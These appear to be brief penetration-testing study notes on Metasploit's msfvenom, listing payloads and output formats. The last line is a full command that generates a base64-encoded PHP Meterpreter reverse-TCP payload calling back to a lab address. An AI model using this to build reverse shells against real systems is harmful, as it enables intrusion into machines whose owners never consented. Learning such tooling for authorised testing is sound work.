# Allows access to payloads in the MSF
# Create payloads in different formats; for different target systems
msfvenom -l payloads

# Output formats
# Generate standalone payloads or get a usable raw format
# List supported output formats
msfvenom --list formats

# Ex. encdoe with -e; PHP version of Meterpreter in BAse64, output raw
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64

